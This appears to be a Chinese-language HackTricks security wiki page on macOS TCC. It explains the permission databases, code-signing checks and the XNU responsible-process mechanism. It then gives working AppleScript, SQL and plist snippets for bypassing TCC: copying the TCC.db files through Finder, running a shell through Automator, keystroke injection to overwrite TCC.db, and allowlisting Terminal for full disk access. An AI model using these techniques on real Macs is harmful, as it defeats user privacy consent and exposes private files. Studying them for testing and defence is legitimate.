# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **基本信息**

**TCC（Transparency, Consent, and Control，透明度、同意与控制）**是一种用于规范应用程序权限的安全协议。其主要作用是保护**定位服务、联系人、照片、麦克风、摄像头、辅助功能和完整磁盘访问权限**等敏感功能。TCC 要求用户明确同意后才授予应用程序访问这些内容的权限，从而增强隐私保护，并让用户更好地控制自己的数据。

当应用程序请求访问受保护的功能时，用户会看到 TCC 提示。用户可以通过提示**批准或拒绝访问**。此外，TCC 也支持用户直接执行操作，例如**将文件拖放到应用程序中**，以授予应用程序访问特定文件的权限，确保应用程序只能访问明确获准的内容。

![TCC 提示示例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** 由位于 `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` 的 **daemon** 处理，并在 `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` 中配置（注册 mach 服务 `com.apple.tccd.system`）。

每个已登录用户都会运行一个**用户模式 tccd**，其定义位于 `/System/Library/LaunchAgents/com.apple.tccd.plist`，并注册 mach 服务 `com.apple.tccd` 和 `com.apple.usernotifications.delegate.com.apple.tccd`。

下面可以看到以 system 和 user 身份运行的 tccd：

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

权限会**从父级**应用继承，且会根据 **Bundle ID** 和 **Developer ID** **跟踪**这些**权限**。

### TCC 数据库

允许/拒绝记录随后存储在一些 TCC 数据库中：

- 系统级数据库 **`/Library/Application Support/com.apple.TCC/TCC.db`**。
  - 此数据库受 **SIP** 保护，因此只有绕过 SIP 才能写入。
- 用户 TCC 数据库 **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**，用于存储每个用户的偏好设置。
  - 此数据库受保护，只有具有高 TCC 权限（如 Full Disk Access）的进程才能写入（但它不受 SIP 保护）。

> [!WARNING]
> 前述数据库的**读取操作也受 TCC 保护**。因此，除非通过具有 TCC 特权的进程，否则**无法读取**普通用户的 TCC 数据库。
>
> 但是，请记住，具有这些高权限的进程（如 **FDA** 或 **`kTCCServiceEndpointSecurityClient`**）能够写入用户的 TCC 数据库。

- 第三个 TCC 数据库位于 **`/var/db/locationd/clients.plist`**，用于标记允许**访问定位服务**的客户端。
- **`/Library/Application Support/com.apple.TCC/REG.db`** 记录已注册的 TCC 数据库路径。除非已注册，否则植入的用户数据库可能会被拒绝；仅知道此路径并不能获得对任一数据库的访问权限。<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** 包含由管理策略设定的隐私偏好策略控制（PPPC）决策。当某个应用具有受管理的授权，但该授权未出现在普通的 `access` 行中时，请检查此文件。<sup>[[7]](#references)</sup>
- 受 SIP 保护的文件 **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**（但任何人都可读取）是一个允许列表，其中列出了需要 TCC 例外的应用。

> [!TIP]
> **iOS** 中的 TCC 数据库位于 **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> **通知中心 UI** 可以**更改系统 TCC 数据库**：
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> 不过，用户可以使用命令行工具 **`tccutil`** **重置规则**；该工具没有文档说明的查询操作。<sup>[[4]](#references)</sup>

#### 查询数据库

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> 检查这两个数据库，可以查看应用已获准、已禁止或尚未请求的权限（应用会请求该权限）。

- **`service`** 是 TCC **权限**的字符串表示
- **`client`** 是拥有这些权限的 **bundle ID** 或 **二进制文件路径**
- **`client_type`** 表示它是 Bundle Identifier(0) 还是绝对路径(1)

<details>

<summary>如何在路径为绝对路径时执行</summary>

只需执行 **`launctl load you_bin.plist`**，并使用类似这样的 plist：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** 可以有不同的值：denied(0)、unknown(1)、allowed(2) 或 limited(3)。
- **`auth_reason`** 可以取以下值：Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)
- **csreq** 字段用于指明如何验证要执行的二进制文件并授予 TCC 权限：

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- 有关表格**其他字段**的更多信息，[**请查看这篇博客文章**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。<sup>[[1]](#references)</sup>

你也可以在 `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` 中查看应用已获得的权限。

> [!TIP]
> 用户可以使用 **`tccutil`** **重置**规则，但必须检查数据库才能查询授权。<sup>[[4]](#references)</sup>

#### 重置 TCC 权限

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### 识别 Apple Events 发送方和目标授权

Automation 授权是**发送方到目标**的决策，并不代表可以控制所有应用。获得用户数据库访问权限后，在尝试以下 [Apple Events](macos-apple-events.md) 或 Finder 工作流之前，先枚举获准的发送方/目标配对。`csreq` 用于识别发送方，`indirect_object_code_identity` 用于识别目标；使用上文的 `csreq` 方法解码任一非空 blob。<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### TCC 签名检查

TCC **数据库**会存储应用程序的 **Bundle ID**，也会**存储**有关**签名**的**信息**，以**确保**请求使用某项权限的 App 是正确的应用。

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> 因此，其他使用相同名称和 bundle ID 的应用将无法访问授予其他应用的权限。

### Entitlements 与 TCC 权限

TCC 授权不会覆盖 **App Sandbox** 限制。沙盒化的相机客户端需要 `com.apple.security.device.camera`；Apple 也为 Hardened Runtime 应用提供此功能。两种 entitlement 都无法绕过单独的用户同意提示。不要把沙盒 entitlement 视为所有非沙盒进程的无条件前提。如果请求失败，请检查可执行文件的 entitlements 以及负责发起请求的应用。<sup>[[8]](#references)[[9]](#references)</sup>

请注意，entitlements 是 plist 文件，也是代码签名的一部分；它们会通过专用 slot 进一步纳入代码签名的哈希计算中，并且内核代码或用户态代码都可以通过 `csops(#169)` 或 `csops_audittoken(#170)` 查询它们。

不过，应用要**访问** `~/Desktop`、`~/Downloads` 和 `~/Documents` 等**特定用户文件夹**，**不需要**任何特定的 **entitlements**。系统会透明地处理访问，并在需要时**提示用户**。

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple 的应用**不会生成提示**。它们的 **entitlements** 列表中包含**预先授予的权限**，这意味着它们**永远不会弹出提示**，也不会出现在任何 **TCC 数据库**中。例如：

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

这将避免 Calendar 请求用户访问提醒事项、日历和通讯录。

> [!TIP]
> 除了一些关于 entitlements 的官方文档外，也可以在 [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) 找到关于 entitlements 的非官方**有趣信息**

一些 TCC 权限包括：kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotos……目前没有定义所有权限的公开列表，但你可以查看这份[**已知权限列表**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)。<sup>[[1]](#references)</sup>

### 敏感的未受保护位置

- $HOME（本身）
- $HOME/.ssh、$HOME/.aws 等
- /tmp

### 用户意图 / com.apple.macl

如前所述，可以**通过将文件拖放到某个 App 上，授予该 App 访问文件的权限**。此访问权限不会记录在任何 TCC 数据库中，而是作为文件的一个**扩展属性**保存。该属性会**存储获准访问的 App 的 UUID**：<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> 有趣的是，**`com.apple.macl`** 属性由 **Sandbox** 管理，而不是由 tccd 管理。
>
> 另请注意，如果将一个允许你电脑上某个应用 UUID 的文件移到另一台电脑，由于同一应用在另一台电脑上的 UID 会不同，因此不会授予该应用访问权限。

扩展属性 `com.apple.macl` **无法像其他扩展属性那样清除**，因为它受 **SIP** 保护。不过，如[**这篇文章所述**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，可以通过**压缩**文件、**删除**文件，再将其**解压缩**来禁用它。<sup>[[3]](#references)</sup>






## XNU 责任进程机制

在 macOS/iOS 中，**责任进程**机制是一项关键安全功能，供 **TCC (Transparency, Consent, and Control)** 框架和其他安全系统使用，用于跟踪最终对某项操作负责的进程，即使操作经过了多个子进程。

当 TCC 检查权限（例如摄像头、麦克风、位置）时，它不总是检查发起请求的直接进程，而是检查**责任进程**——通常是发起该操作的 GUI 应用，即使实际请求来自辅助进程或守护进程。

要识别实际归因于某个请求的应用，请在触发受保护操作时，流式查看 TCC 的 `AttributionChain` 消息。这比仅仅因为辅助可执行文件调用了 API，就向其授予权限更可靠。将报告的身份与相关 `access` 行中的 bundle ID 或路径及签名要求进行比较。<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>责任进程如何设置</summary>

### 进程结构字段

XNU 中的每个进程都维护两个关键的 UUID 标识符：

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**：进程自身的 UUID（来自其 Mach-O 二进制文件的 `LC_UUID` 加载命令）
- **`p_responsible_pid`**：负责进程的 PID
- **`p_responsible_uuid`**：负责进程的 UUID（即使该进程退出后仍会保留）

### 如何设置负责进程

1. **进程创建期间（Fork）**

通过 `fork()` 或 `posix_spawn()` 创建新进程时，会从父进程继承负责进程（`exec()` 系统调用会重用现有的 `proc` 结构，因此不会在此处重复此步骤）：

**位置**：`bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**要点：**
- 子进程会**继承**父进程的 `p_responsible_pid`
- 这会在进程层级中形成一条**责任链**
- 负责进程通常指向最初的 GUI 应用程序

2. **核心函数：`proc_set_responsible_pid()`**

**位置**：`bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**此函数的作用：**
1. **设置目标进程的 responsible PID**
2. 使用 `proc_find()` **查找 responsible process**（增加引用计数）
3. 将 responsible process 的 `p_uuid` 中的 UUID **复制到**目标进程的 `p_responsible_uuid`
4. 使用 `proc_rele()` **释放引用**（减少引用计数）

3. **为什么同时存储 PID 和 UUID？**

这种双重存储方式解决了一个关键问题：

| 字段 | 用途 | 问题 | 解决方案 |
|-------|-------|---------|----------|
| `p_responsible_pid` | 快速查找当前进程 | 进程退出后，PID 可能被重新使用 | 用于查找活动进程 |
| `p_responsible_uuid` | 持久标识 | 进程终止后仍然有效 | 用于安全检查和审计 |

**问题**：如果 responsible process 在子进程退出前先退出，PID 可能会被回收并分配给完全不同的进程。

**解决方案**：UUID 不可变，并且能唯一标识对应的二进制文件，即使该文件对应的进程已经退出。

### 进程创建流程

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### UUID 来源：LC_UUID Load Command

存储在 `p_uuid` 中的 UUID 来自 **Mach-O 可执行文件的 `LC_UUID` load command**：

1. **编译时**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **执行时间**

**位置**：`bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **存储在进程结构中**

**位置**：`bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**位置**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC 权限提升与绕过

### 插入 TCC

如果你在某个时候设法获得了对 TCC 数据库的写入权限，可以使用类似以下内容添加一条记录（移除注释）：

<details>

<summary>插入 TCC 示例</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC payloads

如果你成功进入了一个拥有某些 TCC 权限的应用，请查看以下页面，了解如何滥用 TCC payloads：


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

了解 Apple Events：


{{#ref}}
macos-apple-events.md
{{#endref}}

### 利用 Automation (Finder) 获取 FDA*

Automation 权限在 TCC 中的名称是：**`kTCCServiceAppleEvents`**\
此特定 TCC 权限还会指出 TCC 数据库中**可被管理的应用**（因此，该权限并非允许管理所有应用）。

**Finder** 是一个**始终拥有 FDA** 的应用（即使它没有显示在 UI 中），因此，如果你拥有对它的 **Automation** 权限，就可以滥用它的权限，让它**执行某些操作**。\
在这种情况下，你的应用需要拥有对 **`com.apple.Finder`** 的 **`kTCCServiceAppleEvents`** 权限。<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

有报告称，一种可行的写入变体是：当存在指向 Finder 的 Automation 路径时，让 Finder **重命名用户的 `com.apple.TCC` 目录**。随后，将重命名路径下的数据库复制到暂存目录，在那里修改后再复制回去，并恢复目录名称。新的 `kTCCServiceAppleEvents` 行必须同时标明发送方二进制文件和 Finder，包括二者的代码要求；仅向发送方授予权限，并不等同于标明目标身份。这种技术取决于具体路径，因此请在目标 macOS 版本上验证，不要想当然地认为仅凭 Finder Automation 就能任意写入数据库。<sup>[[11]](#references)</sup>

> [!WARNING]
> 获得此权限后，你可以**要求 Finder 访问受 TCC 限制的文件夹**并将文件交给你；但据我所知，**你无法让 Finder 执行任意代码，从而完全滥用其 FDA 访问权限**。
>
> 因此，你无法滥用完整的 FDA 功能。

这是获取对 Finder 的 Automation 权限时显示的 TCC 提示：

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> 请注意，由于 **Automator** 应用拥有 TCC 权限 **`kTCCServiceAppleEvents`**，它可以**控制任何应用**，例如 Finder。因此，拥有控制 Automator 的权限后，你也可以使用如下代码控制 **Finder**：

<details>

<summary>在 Automator 中获取 shell</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

Script Editor app 也会出现相同情况：它可以控制 Finder，但你无法使用 AppleScript 强制它执行脚本。

### 自动化（SE）访问某些 TCC

**System Events 可以创建 Folder Actions，而 Folder Actions 可以访问某些 TCC 文件夹**（Desktop、Documents 和 Downloads），因此可以使用以下脚本滥用此行为：

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) 获取 FDA\*

对 **`System Events`** 的 Automation 和 Accessibility（**`kTCCServicePostEvent`**）允许向**进程发送按键输入**。这样，你就可以滥用 Finder 修改用户的 TCC.db，或向任意应用授予 FDA（不过这可能会触发密码提示）。

Finder 覆写用户 TCC.db 示例：

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` 到 FDA\*

查看此页面，了解一些[**滥用 Accessibility 权限的 payload**](macos-tcc-payloads.md#accessibility)，例如用于 privesc 到 FDA\* 或运行键盘记录器。

### **Endpoint Security Client 到 FDA**

如果你拥有 **`kTCCServiceEndpointSecurityClient`**，就拥有 FDA。就这么简单。

### System Policy SysAdmin File 到 FDA

**`kTCCServiceSystemPolicySysAdminFiles`** 允许**更改**用户的 **`NFSHomeDirectory`** 属性，从而更改其主文件夹，因此可以**绕过 TCC**。<sup>[[5]](#references)</sup>

### 用户 TCC DB 到 FDA

获得用户 **TCC** 数据库的**写入权限**后，你**无法**授予自己 **`FDA`** 权限；只有系统数据库中的记录才能授予该权限。

但你可以授予自己 **Finder 的 Automation 权限**，然后滥用前一种技术来提升到 FDA\*。

### **FDA 到 TCC 权限**

**Full Disk Access** 在 TCC 中的名称是 **`kTCCServiceSystemPolicyAllFiles`**

我不认为这是真正的 privesc，不过以防你觉得有用：如果你控制了一个拥有 FDA 的程序，就可以**修改用户的 TCC 数据库并授予自己任意访问权限**。如果你可能会失去 FDA 权限，这可以用作一种持久化技术。

### **SIP 绕过到 TCC 绕过**

系统 **TCC 数据库**受 **SIP** 保护，因此只有拥有**指定 entitlement 的进程才能修改**它。因此，如果攻击者找到针对某个**文件**的 **SIP 绕过**（能够修改受 SIP 限制的文件），就能：

- **移除 TCC 数据库的保护**，并为自己授予所有 TCC 权限。例如，可以滥用以下任意文件：
  - TCC 系统数据库
  - REG.db
  - MDMOverrides.plist

不过，还有另一种利用此 **SIP 绕过来绕过 TCC** 的方法：文件 `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` 是一个允许列表，其中列出了需要 TCC 例外的应用程序。因此，如果攻击者能**移除此文件的 SIP 保护**并添加**自己的应用程序**，该应用程序就能绕过 TCC。\
例如，添加 terminal：

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### TCC 绕过


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [深入解析 macOS TCC.db - Rainforest QA 博客](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - 跟踪 com.apple.macl 的脚本（brunerd 的 Gist）](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [跟踪并应对 com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [意外与蓄意绕过 macOS TCC 用户隐私保护机制](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [更改主目录并绕过 TCC，即 CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
